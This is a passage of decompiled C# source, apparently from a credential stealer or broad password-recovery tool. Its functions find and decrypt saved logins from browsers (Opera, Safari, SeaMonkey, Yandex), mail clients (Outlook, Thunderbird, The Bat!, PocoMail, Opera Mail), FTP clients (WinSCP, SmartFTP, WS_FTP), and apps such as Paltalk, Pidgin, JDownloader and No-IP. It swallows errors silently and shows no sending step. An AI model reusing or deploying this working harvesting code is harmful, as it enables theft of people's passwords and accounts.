                        Browser = Conversions.ToString(NewLateBinding.LateGet(instance, null, "Browser", new object[0], null, null, null))
                    };
                    list.Add(item);
                }
                return list;
            }
            finally
            {
                if (enumerator is IDisposable)
                {
                    (enumerator as IDisposable).Dispose();
                }
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> GetOperaPasswords()
    {
        List<RecoveredBrowserAccount> list;
        try
        {
            list = Recovery.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera Stable\Login Data"), "Opera");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            list = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list;
    }

    [DllImport("kernel32", CharSet=CharSet.Auto, SetLastError=true)]
    private static extern int GetPrivateProfileString([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpAppName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpKeyName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDefault, StringBuilder lpReturnedString, int nSize, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName);
    internal static List<RecoveredBrowserAccount> GetSafariPasswords()
    {
        List<RecoveredBrowserAccount> list;
        try
        {
            string plutil = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Common Files\Apple\Apple Application Support\plutil.exe";
            string keychain = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Apple Computer\Preferences\keychain.plist";
            string fixedPath = null;
            if (!SafariDecryptor.ConvertKeychain(plutil, keychain, ref fixedPath))
            {
                return null;
            }
            list = SafariDecryptor.ParseEntries(fixedPath.Remove(fixedPath.Length - 2));
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            list = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> GetSeaMonkeyPasswords()
    {
        List<RecoveredBrowserAccount> list2;
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        string str = string.Empty;
        string str3 = string.Empty;
        string str2 = string.Empty;
        try
        {
            object objectValue = RuntimeHelpers.GetObjectValue(Firefox.mozProfilePath("seamonkey"));
            if (!File.Exists(Conversions.ToString(Operators.ConcatenateObject(objectValue, "logins.json"))))
            {
                return null;
            }
            Firefox.Load(Conversions.ToString(objectValue));
            string input = File.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(objectValue, "logins.json")));
            MatchCollection matchs = new Regex("\\\"(hostname|encryptedPassword|encryptedUsername)\":\"(.*?)\"").Matches(input);
            int num2 = matchs.Count - 1;
            for (int i = 0; i <= num2; i += 3)
            {
                str = matchs[i].Groups[2].Value;
                str3 = matchs[i + 1].Groups[2].Value;
                str2 = matchs[i + 2].Groups[2].Value;
                if ((!string.IsNullOrEmpty(str) && !string.IsNullOrEmpty(str3)) && (str2 != null))
                {
                    RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                        URL = str,
                        UserName = Conversions.ToString(Firefox.mozDecryptString(str3)),
                        Password = Conversions.ToString(Firefox.mozDecryptString(str2)),
                        Browser = "SeaMonkey"
                    };
                    list.Add(item);
                }
            }
            Firefox.Unload();
            list2 = list;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            Firefox.Unload();
            list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list2;
    }

    internal static List<RecoveredBrowserAccount> GetWinSCPPasswords()
    {
        List<RecoveredBrowserAccount> list2;
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            string name = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(name))
            {
                foreach (string str2 in key.GetSubKeyNames())
                {
                    using (RegistryKey key2 = key.OpenSubKey(str2))
                    {
                        if (key2 != null)
                        {
                            string str3 = Conversions.ToString(key2.GetValue("HostName"));
                            if (!string.IsNullOrEmpty(str3))
                            {
                                string user = Conversions.ToString(key2.GetValue("UserName"));
                                string str4 = WinSCP.WinSCPDecrypt(user, Conversions.ToString(key2.GetValue("Password")), str3);
                                string str5 = Conversions.ToString(key2.GetValue("PublicKeyFile"));
                                str3 = Conversions.ToString(Operators.AddObject(str3, Operators.AddObject(":", key2.GetValue("PortNumber", "22"))));
                                if (string.IsNullOrEmpty(str4) && !string.IsNullOrEmpty(str5))
                                {
                                    str4 = $"[PRIVATE KEY LOCATION: "{Uri.UnescapeDataString(str5)}"]";
                                }
                                RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                                    URL = str3,
                                    UserName = user,
                                    Password = str4,
                                    Browser = "WinSCP"
                                };
                                list.Add(item);
                            }
                        }
                    }
                }
            }
            list2 = list;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            list2 = list;
            ProjectData.ClearProjectError();
        }
        return list2;
    }

    internal static List<RecoveredBrowserAccount> GetYandexPasswords()
    {
        List<RecoveredBrowserAccount> list;
        try
        {
            list = Recovery.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Yandex\YandexBrowser\User Data\Default\Login Data"), "Yandex");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            list = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list;
    }

    internal static string HexToString(string hex)
    {
        StringBuilder builder = new StringBuilder(hex.Length / 2);
        int num2 = hex.Length - 2;
        for (int i = 0; i <= num2; i += 2)
        {
            builder.Append(Strings.Chr(Convert.ToByte(hex.Substring(i, 2), 0x10)));
        }
        return builder.ToString();
    }

    internal static bool Is_Containing(string input, string search) => 
        input.Contains(search);

    internal static List<RecoveredBrowserAccount> JDownloader()
    {
        string str3 = "";
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        string str5 = "";
        string str4 = "";
        string str2 = "";
        try
        {
            string str;
            if (Interaction.Environ("Programfiles(x86)") == null)
            {
                str = Interaction.Environ("programfiles") + @"\jDownloader\config\database.script";
            }
            else
            {
                str = Interaction.Environ("programfiles(x86)") + @"\jDownloader\config\database.script";
            }
            if (!File.Exists(str))
            {
                return null;
            }
            string str6 = "INSERT INTO CONFIG VALUES('AccountController','";
            string[] strArray = File.ReadAllLines(str);
            int num6 = strArray.Length - 1;
            for (int i = 0; i <= num6; i++)
            {
                if (strArray[i].Contains(str6))
                {
                    string str7 = strArray[i].Substring(str6.Length - 1).Substring(1, strArray[i].Length - ((str6.Length + 1) + 3));
                    int num7 = str7.Length - 1;
                    for (int j = 0; j <= num7; j += 2)
                    {
                        str3 = str3 + Conversions.ToString(Strings.Chr(Conversions.ToInteger("&H" + str7.Substring(j, 2))));
                    }
                    str7 = "";
                    string[] strArray3 = str3.Split(new char[] { '\0' });
                    int num8 = strArray3.Length - 1;
                    for (int k = 0; k <= num8; k++)
                    {
                        int charCode = 1;
                        do
                        {
                            strArray3[k] = strArray3[k].Replace(Conversions.ToString(Strings.Chr(charCode)), "");
                            charCode++;
                        }
                        while (charCode <= 0x1f);
                        strArray3[k] = strArray3[k].Replace("�", "");
                        if (strArray3[k] != "")
                        {
                            str7 = str7 + "\r\n" + strArray3[k];
                        }
                    }
                    string[] strArray2 = str7.ToString().Split(new char[] { '\r' });
                    int num9 = strArray2.Length - 2;
                    for (int m = 0; m <= num9; m++)
                    {
                        if (strArray2[m].EndsWith("sq") & (strArray2[m].IndexOf(".") > 0))
                        {
                            str2 = strArray2[m].Substring(0, strArray2[m].Length - 2);
                        }
                        if (strArray2[m].EndsWith("t") & strArray2[m + 1].EndsWith("xt"))
                        {
                            str4 = strArray2[m].Substring(0, strArray2[m].Length - 1);
                            str5 = strArray2[m + 1].Substring(0, strArray2[m + 1].Length - 2);
                            RecoveredBrowserAccount item = new RecoveredBrowserAccount();
                            if (str4.Length > 4)
                            {
                                item.URL = str2;
                                item.UserName = str5;
                                item.Password = str4;
                                item.Browser = "JDownloader";
                                list.Add(item);
                            }
                        }
                    }
                }
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> no_ip()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        string keyName = @"HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC";
        string str = @"HKEY_CURRENT_USER\SOFTWARE\Vitalwerks\DUC";
        try
        {
            string str5 = Conversions.ToString(Registry.GetValue(keyName, "USERname", ""));
            string data = Conversions.ToString(Registry.GetValue(keyName, "Password", ""));
            string str6 = Conversions.ToString(Registry.GetValue(str, "UserName", ""));
            string str4 = Conversions.ToString(Registry.GetValue(str, "Password", ""));
            if ((str5 == "") & (str6 == ""))
            {
                return null;
            }
            if (str5 != "")
            {
                RecoveredBrowserAccount account = new RecoveredBrowserAccount {
                    URL = "http://no-ip.com",
                    UserName = str5,
                    Password = base64Decode(data),
                    Browser = "NO-IP"
                };
                list.Add(account);
                return list;
            }
            RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                URL = "http://no-ip.com",
                UserName = str6,
                Password = base64Decode(str4),
                Browser = "NO-IP"
            };
            list.Add(item);
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> OperaMail()
    {
        List<RecoveredBrowserAccount> list2;
        string left = "";
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string str2 = "";
        string str3 = "";
        if (File.Exists(folderPath + @"\Opera Mail\Opera Mail\wand.dat"))
        {
            folderPath = folderPath + @"\Opera Mail\Opera Mail\wand.dat";
        }
        else
        {
            return new List<RecoveredBrowserAccount>();
        }
        try
        {
            byte[] sourceArray = File.ReadAllBytes(folderPath);
            int num = 0;
            int num4 = sourceArray.Length - 5;
            for (int i = 0; i <= num4; i++)
            {
                if (((sourceArray[i] == 0) && (sourceArray[i + 1] == 0)) && ((sourceArray[i + 2] == 0) && (sourceArray[i + 3] == 8)))
                {
                    num = sourceArray[i + 15];
                    byte[] destinationArray = new byte[8];
                    byte[] buffer2 = new byte[(num - 1) + 1];
                    Array.Copy(sourceArray, i + 4, destinationArray, 0, destinationArray.Length);
                    Array.Copy(sourceArray, i + 0x10, buffer2, 0, buffer2.Length);
                    left = Conversions.ToString(Operators.AddObject(left, Operators.ConcatenateObject(decrypt2_method(destinationArray, buffer2), "\r\n")));
                    i += 11 + num;
                }
            }
            string[] strArray = Strings.Split(FL(left), "\r\n", -1, CompareMethod.Binary);
            int num5 = strArray.Length - 3;
            for (int j = 4; j <= num5; j += 3)
            {
                RecoveredBrowserAccount item = new RecoveredBrowserAccount();
                str2 = strArray[j + 1];
                str3 = strArray[j + 2];
                item.URL = "-";
                item.UserName = str2;
                item.Password = str3;
                item.Browser = "Opera Mail";
                list.Add(item);
            }
            list2 = list;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list2;
    }

    internal static List<RecoveredBrowserAccount> Outlook()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            RegistryKey[] keyArray = new RegistryKey[] { Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"), Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"), Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676") };
            foreach (RegistryKey key in keyArray)
            {
                if (key != null)
                {
                    foreach (string str in key.GetSubKeyNames())
                    {
                        using (RegistryKey key2 = key.OpenSubKey(str))
                        {
                            UTF8Encoding encoding = new UTF8Encoding();
                            if ((key2.GetValue("Email") != null) & ((((key2.GetValue("IMAP Password") != null) | (key2.GetValue("POP3 Password") != null)) | (key2.GetValue("HTTP Password") != null)) | (key2.GetValue("SMTP Password") != null)))
                            {
                                string[] strArray = new string[] { "IMAP Password", "POP3 Password", "HTTP Password", "SMTP Password" };
                                string str2 = "";
                                foreach (string str3 in strArray)
                                {
                                    if (key2.GetValue(str3) != null)
                                    {
                                        byte[] encryptedData = (byte[]) key2.GetValue(str3);
                                        str2 = decryptOutlookPassword(encryptedData);
                                    }
                                }
                                byte[] bytes = (byte[]) key2.GetValue("Email");
                                RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                                    URL = "-",
                                    UserName = encoding.GetString(bytes).ToString().Replace(Conversions.ToString(Convert.ToChar(0)), ""),
                                    Password = str2.Replace(Conversions.ToString(Convert.ToChar(0)), ""),
                                    Browser = "Outlook"
                                };
                                list.Add(item);
                            }
                        }
                    }
                }
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> paltalk()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            char[] array = P.HWD().ToCharArray();
            RegistryKey currentUser = Registry.CurrentUser;
            currentUser = Registry.CurrentUser.OpenSubKey(@"Software\Paltalk");
            string[] subKeyNames = currentUser.GetSubKeyNames();
            currentUser.Close();
            foreach (string str5 in subKeyNames)
            {
                int num3;
                string str4 = Conversions.ToString(Registry.GetValue(@"HKEY_CURRENT_USER\Software\Paltalk\" + str5, "pwd", ""));
                char[] chArray2 = str4.ToCharArray();
                string[] strArray2 = new string[((int) Math.Round((double) (((double) str4.Length) / 4.0))) + 1];
                while (num3 <= (Information.UBound(chArray2, 1) - 4))
                {
                    int num2;
                    if (num3 < (Information.UBound(chArray2, 1) - 4))
                    {
                        strArray2[num2] = Conversions.ToString(chArray2[num3]) + Conversions.ToString(chArray2[num3 + 1]) + Conversions.ToString(chArray2[num3 + 2]);
                    }
                    num3 += 4;
                    num2++;
                }
                string str3 = "";
                string str6 = str5;
                int num6 = 0;
                int length = str6.Length;
                while (num6 < length)
                {
                    int num;
                    char ch = str6[num6];
                    str3 = str3 + Conversions.ToString(ch);
                    if (num <= Information.UBound(array, 1))
                    {
                        str3 = str3 + Conversions.ToString(array[num]);
                    }
                    num++;
                    num6++;
                }
                str3 = str3 + str3 + str3;
                char[] chArray3 = str3.ToCharArray();
                string str2 = "";
                str2 = str2 + Conversions.ToString(Strings.Chr((int) Math.Round((double) ((Conversions.ToDouble(strArray2[0]) - 122.0) - Strings.Asc(str3.Substring(str3.Length - 1, 1))))));
                int num8 = Information.UBound(strArray2, 1);
                for (int i = 1; i <= num8; i++)
                {
                    if (strArray2[i] != null)
                    {
                        char ch2 = Strings.Chr((int) Math.Round((double) (((Conversions.ToDouble(strArray2[i]) - i) - Strings.Asc(chArray3[i - 1])) - 122.0)));
                        str2 = str2 + Conversions.ToString(ch2);
                    }
                }
                RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                    URL = "http://Paltalk.com",
                    UserName = str5,
                    Password = str2,
                    Browser = "Paltalk"
                };
                list.Add(item);
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> Pidgin()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            if (!File.Exists(Interaction.Environ("APPDATA") + @"\.purple\accounts.xml"))
            {
                return new List<RecoveredBrowserAccount>();
            }
            string input = File.ReadAllText(Interaction.Environ("APPDATA") + @"\.purple\accounts.xml");
            int count = Regex.Matches(input, Regex.Escape("<account>")).Count;
            int num3 = count - 1;
            for (int i = 0; i <= num3; i++)
            {
                string str3 = GetBetween(input, "<protocol>", "</protocol>", i);
                string str4 = GetBetween(input, "<name>", "</name>", i);
                string str5 = GetBetween(input, "<password>", "</password>", i);
                RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                    URL = str3,
                    UserName = str4,
                    Password = str5,
                    Browser = "Pidgin"
                };
                list.Add(item);
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static string poco_pwd(string pwd, int type)
    {
        int num;
        byte[] bytes = Encoding.Default.GetBytes(HexToString(pwd));
        byte[] buffer2 = new byte[(bytes.Length - 1) + 1];
        if (type != 0)
        {
            num = 0x2537;
        }
        else
        {
            num = 0x2a9a;
        }
        try
        {
            int num3 = bytes.Length - 1;
            for (int i = 0; i <= num3; i++)
            {
                buffer2[i] = BitConverter.GetBytes((int) (bytes[i] ^ (num >> 8)))[0];
                num = ((bytes[i] + num) * 0x8141) + 0x3171;
                num = BitConverter.ToInt16(BitConverter.GetBytes(num), 0);
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
            return "No data!";
        }
        return Encoding.Default.GetString(buffer2);
    }

    internal static List<RecoveredBrowserAccount> PocoMail()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        IniFile file = new IniFile();
        if (File.Exists(Environment.GetEnvironmentVariable("appdata") + @"\Pocomail\accounts.ini"))
        {
            file.Load(Environment.GetEnvironmentVariable("appdata") + @"\Pocomail\accounts.ini");
        }
        else
        {
            return new List<RecoveredBrowserAccount>();
        }
        foreach (string str3 in file.Keys)
        {
            RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                URL = "-"
            };
            foreach (string str4 in file[str3].Keys)
            {
                if (str4 == "Email")
                {
                    item.UserName = file[str3][str4];
                }
                else if (str4 == "POPPass")
                {
                    if (file[str3][str4] != null)
                    {
                        item.Password = poco_pwd(file[str3][str4], 0);
                    }
                }
                else if ((str4 == "SMTPPass") && (file[str3][str4] != ""))
                {
                    item.Password = poco_pwd(file[str3][str4], 0);
                }
            }
            item.Browser = "PocoMail";
            list.Add(item);
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> SmartFTP()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            string path = Interaction.Environ("APPDATA") + @"\SmartFTP\Client 2.0\Favorites\Quick Connect\" + FileSystem.Dir(Interaction.Environ("APPDATA") + "SmartFTPClient 2.0FavoritesQuick Connect*.xml", FileAttribute.Normal);
            if (!File.Exists(path))
            {
                return new List<RecoveredBrowserAccount>();
            }
            string sInhalt = P.ReadFile(path);
            string str3 = P.Cut(sInhalt, "<Host>", "</Host>");
            string str5 = P.Cut(sInhalt, "<Port>", "</Port>");
            string str7 = P.Cut(sInhalt, "<User>", "</User>");
            string str6 = P.Cut(sInhalt, "<Password>", "</Password>");
            string str = P.Cut(sInhalt, "<Name>", "</Name>");
            if (str7 != "")
            {
                try
                {
                    RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                        URL = str3 + ":" + str5,
                        UserName = str7,
                        Password = str6,
                        Browser = "SmartFTP"
                    };
                    list.Add(item);
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    Exception exception = exception1;
                    ProjectData.ClearProjectError();
                }
            }
            return list;
        }
        catch (Exception exception3)
        {
            ProjectData.SetProjectError(exception3);
            Exception exception2 = exception3;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> TheBat()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        string str2 = "";
        string str = "";
        if (Directory.Exists(Environment.GetEnvironmentVariable("appdata") + @"\The Bat!"))
        {
            string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("appdata") + @"\The Bat!");
            try
            {
                int num3 = directories.Length - 1;
                for (int i = 0; i <= num3; i++)
                {
                    if (File.Exists(directories[i] + @"\Account.CFN"))
                    {
                        string[] strArray3 = File.ReadAllLines(directories[i] + @"\Account.CFN");
                        string expression = strArray3[strArray3.Length - 1];
                        string[] strArray2 = Strings.Split(expression, "\0\0\0", -1, CompareMethod.Binary);
                        int num2 = 0;
                        foreach (string str6 in strArray2)
                        {
                            if (str6 != null)
                            {
                                string input = str6.Substring(0, Strings.InStr(str6, "\0", CompareMethod.Binary));
                                if (input.Length > 2)
                                {
                                    input = input.Replace("\0", "");
                                    switch (num2)
                                    {
                                        case 0:
                                            str2 = decryptBat(input);
                                            num2++;
                                            break;
                                    }
                                }
                            }
                        }
                        RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                            URL = "-",
                            UserName = str2,
                            Password = str,
                            Browser = "TheBat"
                        };
                        list.Add(item);
                    }
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
                ProjectData.ClearProjectError();
                return list2;
            }
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> Thunderbird()
    {
        List<RecoveredBrowserAccount> list;
        string str = string.Empty;
        string str4 = string.Empty;
        string str2 = string.Empty;
        object objectValue = RuntimeHelpers.GetObjectValue(Firefox.mozProfilePath("thunderbird"));
        string path = Conversions.ToString(Operators.ConcatenateObject(objectValue, "signons.sqlite"));
        try
        {
            SQLiteHandler handler;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            if (!File.Exists(path))
            {
                return list2;
            }
            Firefox.Load(Conversions.ToString(objectValue));
            try
            {
                handler = new SQLiteHandler(path);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                list = list2;
                ProjectData.ClearProjectError();
                return list;
            }
            if (!handler.ReadTable("moz_logins"))
            {
                return list2;
            }
            int num2 = handler.GetRowCount() - 1;
            for (int i = 0; i <= num2; i++)
            {
                try
                {
                    str = handler.GetValue(i, "hostname");
                    str4 = handler.GetValue(i, "encryptedUsername");
                    str2 = handler.GetValue(i, "encryptedPassword");
                    if ((!string.IsNullOrEmpty(str) && !string.IsNullOrEmpty(str4)) && (str2 != null))
                    {
                        RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                            URL = str,
                            UserName = Conversions.ToString(Firefox.mozDecryptString(str4)),
                            Password = Conversions.ToString(Firefox.mozDecryptString(str2)),
                            Browser = "Thunderbird"
                        };
                        list2.Add(item);
                    }
                    else
                    {
                        return new List<RecoveredBrowserAccount>();
                    }
                }
                catch (Exception exception4)
                {
                    ProjectData.SetProjectError(exception4);
                    Exception exception2 = exception4;
                    ProjectData.ClearProjectError();
                }
            }
            Firefox.Unload();
            list = list2;
        }
        catch (Exception exception5)
        {
            ProjectData.SetProjectError(exception5);
            Exception exception3 = exception5;
            Firefox.Unload();
            list = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list;
    }

    internal static byte[] TrimBytes(byte[] input)
    {
        if (input.Length <= 1)
        {
            return new byte[0];
        }
        int index = input.Length - 1;
        while (input[index] == 0)
        {
            index--;
        }
        byte[] buffer2 = new byte[((index + 1) - 1) + 1];
        int num3 = (index + 1) - 1;
        for (int i = 0; i <= num3; i++)
        {
            buffer2[i] = input[i];
        }
        return buffer2;
    }

    internal static List<RecoveredBrowserAccount> WS_FTP()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        string str = "";
        IniFile file = new IniFile();
        if (File.Exists(Environment.GetEnvironmentVariable("appdata") + @"\Ipswitch\WS_FTP\Sites\ws_ftp.ini"))
        {
            file.Load(Environment.GetEnvironmentVariable("appdata") + @"\Ipswitch\WS_FTP\Sites\ws_ftp.ini");
        }
        else
        {
            return new List<RecoveredBrowserAccount>();
        }
        try
        {
            Dictionary<string, Dictionary<string, string>>.KeyCollection.Enumerator enumerator;
            try
            {
                enumerator = file.Keys.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    string current = enumerator.Current;
                    RecoveredBrowserAccount item = new RecoveredBrowserAccount();
                    foreach (string str3 in file[current].Keys)
                    {
                        switch (str3)
                        {
                            case "HOST":
                                item.URL = file[current][str3].Replace("\"", "");
                                goto Label_01E0;

                            case "UID":
                                if (file[current][str3] != null)
                                {
                                    item.UserName = file[current][str3].Replace("\"", "");
                                }
                                goto Label_01E0;

                            default:
                            {
                                if ((str3 != "PWD") || (file[current][str3] == ""))
                                {
                                    goto Label_01E0;
                                }
                                string str4 = DecryptWSFTP(file[current][str3].Replace("\"", ""));
                                if (str4 != null)
                                {
                                    string str5 = str4;
                                    int num = 0;
                                    int length = str5.Length;
                                    while (num < length)
                                    {
                                        char ch = str5[num];
                                        if (ch == '\0')
                                        {
                                            break;
                                        }
                                        str = str + Conversions.ToString(ch);
                                        num++;
                                    }
                                }
                                else
                                {
                                    str = DecodeWSFTP(file[current][str3]);
                                }
                                break;
                            }
                        }
                        item.Password = str;
                        str = "";
                    Label_01E0:
                        item.Browser = "WS_FTP";
                    }
                    if ((item.UserName != "") & (item.Password != ""))
                    {
                        list.Add(item);
                    }
                }
                return list;
            }
            finally
            {
                enumerator.Dispose();
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
        return list;
    }

    public class IniFile : Dictionary<string, Dictionary<string, string>>
    {
        public void Load(string filename)
        {
            string key = string.Empty;
            using (StreamReader reader = new StreamReader(filename))
            {
                while (!reader.EndOfStream)
                {
                    string str2 = reader.ReadLine();
                    if (str2.StartsWith("[") && str2.EndsWith("]"))
                    {
                        key = str2.Substring(1, str2.Length - 2);
                        if (!this.ContainsKey(key))
                        {
                            this.Add(key, new Dictionary<string, string>());
                        }
                    }
                    else if (!str2.StartsWith(";") && str2.Contains("="))
                    {
                        int index = str2.IndexOf('=');
                        this[key][str2.Substring(0, index)] = str2.Substring(index + 1, (str2.Length - index) - 1);
                    }
                }
            }
        }
    }
}

